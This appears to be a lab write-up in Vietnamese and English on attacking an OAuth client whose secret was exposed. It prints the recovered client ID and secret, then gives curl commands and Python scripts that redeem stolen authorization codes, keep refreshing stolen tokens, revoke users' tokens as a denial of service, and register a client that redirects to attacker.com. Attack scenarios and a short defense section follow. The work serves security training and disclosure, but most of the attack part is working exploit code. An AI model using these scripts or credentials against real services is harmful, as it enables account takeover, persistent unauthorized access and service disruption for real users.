# Client Secret Attack Vectors - Lab04

## 🔐 **Client Credentials từ Lab04**

Từ việc reverse engineer callback page:
```
Client ID: f20e7e23-0376-4c18-9e05-1f862264a288
Client Secret: 8vM9ecVb7PC9PBpoj23uwfWty0yJdVVL
```

## 🎯 **Attack Vectors với Client Secret**

### 1. **Authorization Code Hijacking**
**Tác động**: Steal authorization codes từ legitimate users

```bash
# Intercept authorization code từ callback URLs
# Sau đó exchange với stolen client credentials
curl -X POST https://server-04.oauth.labs/oauth/token \
  -H "Authorization: Basic ZjIwZTdlMjMtMDM3Ni00YzE4LTllMDUtMWY4NjIyNjRhMjg4Ojh2TTllY1ZiN1BDOVBCcG9qMjN1d2ZXdHkweUpkVlZM" \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://client-04.oauth.labs/callback"
```

### 2. **Refresh Token Abuse**
**Tác động**: Maintain persistent access với stolen refresh tokens

```bash
# Sử dụng stolen refresh token để get new access tokens
curl -X POST https://server-04.oauth.labs/oauth/token \
  -H "Authorization: Basic ZjIwZTdlMjMtMDM3Ni00YzE4LTllMDUtMWY4NjIyNjRhMjg4Ojh2TTllY1ZiN1BDOVBCcG9qMjN1d2ZXdHkweUpkVlZM" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=STOLEN_REFRESH_TOKEN"
```

### 3. **Token Revocation Attacks**
**Tác động**: DoS attack bằng cách revoke tokens của legitimate users

```bash
# Revoke victim's tokens để force re-authentication
curl -X POST https://server-04.oauth.labs/oauth/revoke \
  -H "Authorization: Basic ZjIwZTdlMjMtMDM3Ni00YzE4LTllMDUtMWY4NjIyNjRhMjg4Ojh2TTllY1ZiN1BDOVBCcG9qMjN1d2ZXdHkweUpkVlZM" \
  -d "token=VICTIM_ACCESS_TOKEN"
```

### 4. **Dynamic Client Registration Abuse**
**Tác động**: Register malicious clients với same client_id

```bash
# Attempt to re-register client với malicious redirect URIs
curl -X POST https://server-04.oauth.labs/oauth/register \
  -H "Authorization: Basic ZjIwZTdlMjMtMDM3Ni00YzE4LTllMDUtMWY4NjIyNjRhMjg4Ojh2TTllY1ZiN1BDOVBCcG9qMjN1d2ZXdHkweUpkVlZM" \
  -H "x-register-key: REGISTRATION_SECRET" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Malicious Client",
    "redirect_uris": ["https://attacker.com/callback"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "scope": "read:profile"
  }'
```

### 5. **Session Hijacking via Code Exchange**
**Tác động**: Impersonate legitimate users

```bash
# Steal authorization code từ victim's browser
# Exchange for tokens using compromised client secret
# Gain access to victim's profile and data
```

## 🛠️ **Exploitation Scripts**

### Script 1: Authorization Code Stealer
```python
# code_stealer.py
import requests
import base64

CLIENT_ID = "f20e7e23-0376-4c18-9e05-1f862264a288"
CLIENT_SECRET = "8vM9ecVb7PC9PBpoj23uwfWty0yJdVVL"
TOKEN_URL = "https://server-04.oauth.labs/oauth/token"

def exchange_stolen_code(authorization_code, redirect_uri="https://client-04.oauth.labs/callback"):
    """Exchange stolen authorization code for access token"""
    
    # Prepare client credentials
    credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    b64_credentials = base64.b64encode(credentials.encode()).decode()
    
    headers = {
        "Authorization": f"Basic {b64_credentials}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "grant_type": "authorization_code",
        "code": authorization_code,
        "redirect_uri": redirect_uri
    }
    
    response = requests.post(TOKEN_URL, headers=headers, data=data, verify=False)
    
    if response.status_code == 200:
        tokens = response.json()
        print(f"[+] Successfully exchanged code!")
        print(f"[+] Access Token: {tokens.get('access_token')}")
        print(f"[+] Refresh Token: {tokens.get('refresh_token')}")
        return tokens
    else:
        print(f"[-] Failed to exchange code: {response.text}")
        return None

# Usage: python code_stealer.py STOLEN_CODE
```

### Script 2: Refresh Token Abuser
```python
# refresh_abuser.py
import requests
import base64
import time

def abuse_refresh_token(refresh_token):
    """Continuously refresh tokens to maintain access"""
    
    credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    b64_credentials = base64.b64encode(credentials.encode()).decode()
    
    headers = {
        "Authorization": f"Basic {b64_credentials}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    while True:
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }
        
        response = requests.post(TOKEN_URL, headers=headers, data=data, verify=False)
        
        if response.status_code == 200:
            tokens = response.json()
            print(f"[+] Refreshed token at {time.ctime()}")
            refresh_token = tokens.get('refresh_token', refresh_token)
            time.sleep(300)  # Refresh every 5 minutes
        else:
            print(f"[-] Refresh failed: {response.text}")
            break
```

### Script 3: Token Revoker (DoS)
```python
# token_revoker.py
def revoke_token(token):
    """Revoke victim's token causing DoS"""
    
    credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    b64_credentials = base64.b64encode(credentials.encode()).decode()
    
    headers = {
        "Authorization": f"Basic {b64_credentials}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {"token": token}
    
    response = requests.post(
        "https://server-04.oauth.labs/oauth/revoke", 
        headers=headers, 
        data=data, 
        verify=False
    )
    
    if response.status_code == 200:
        print(f"[+] Successfully revoked token: {token[:20]}...")
        return True
    else:
        print(f"[-] Failed to revoke token: {response.text}")
        return False
```

## 🎭 **Real-world Attack Scenarios**

### Scenario 1: Web Application Takeover
1. **Victim visits malicious site**
2. **Attacker redirects to legitimate OAuth authorize endpoint**
3. **User grants permission thinking it's legitimate**
4. **Attacker intercepts authorization code**
5. **Attacker exchanges code using stolen client secret**
6. **Attacker gains full access to victim's account**

### Scenario 2: Session Persistence Attack
1. **Attacker compromises one user session**
2. **Extracts refresh token từ session**
3. **Uses stolen client secret để maintain access**
4. **Continuously refreshes tokens in background**
5. **Maintains persistent access even after user logs out**

### Scenario 3: Denial of Service
1. **Attacker monitors network traffic**
2. **Collects access/refresh tokens từ legitimate users**
3. **Uses client secret để revoke all tokens**
4. **Forces all users to re-authenticate**
5. **Causes service disruption**

## 🛡️ **Defense Mechanisms**

### 1. **Client Secret Rotation**
```bash
# Regularly rotate client secrets
# Invalidate old secrets immediately
# Monitor for unauthorized usage
```

### 2. **Token Binding**
```bash
# Bind tokens to specific client instances
# Validate token origin and client context
# Implement mutual TLS authentication
```

### 3. **Rate Limiting**
```bash
# Limit token endpoint requests per client
# Implement progressive delays for failed attempts
# Monitor for suspicious patterns
```

### 4. **Monitoring & Alerting**
```bash
# Log all client authentication attempts
# Alert on multiple failed authentications
# Monitor token usage patterns
```

## 📊 **Impact Assessment**

| Attack Vector | Likelihood | Impact | Risk Level |
|---------------|------------|--------|------------|
| Code Hijacking | High | High | **Critical** |
| Refresh Token Abuse | Medium | High | **High** |
| Token Revocation DoS | Medium | Medium | **Medium** |
| Client Registration | Low | High | **Medium** |
| Session Persistence | High | High | **Critical** |

## 🚨 **Immediate Actions Required**

1. **Rotate all client secrets immediately**
2. **Implement client secret protection**
3. **Move token exchange to server-side**
4. **Add monitoring for client secret abuse**
5. **Implement rate limiting on OAuth endpoints**

## 🔗 **References**

- [RFC 6749 - OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [RFC 7009 - OAuth 2.0 Token Revocation](https://tools.ietf.org/html/rfc7009)
- [OAuth 2.0 Security Best Practices](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [Client Authentication Methods](https://tools.ietf.org/html/rfc7523) 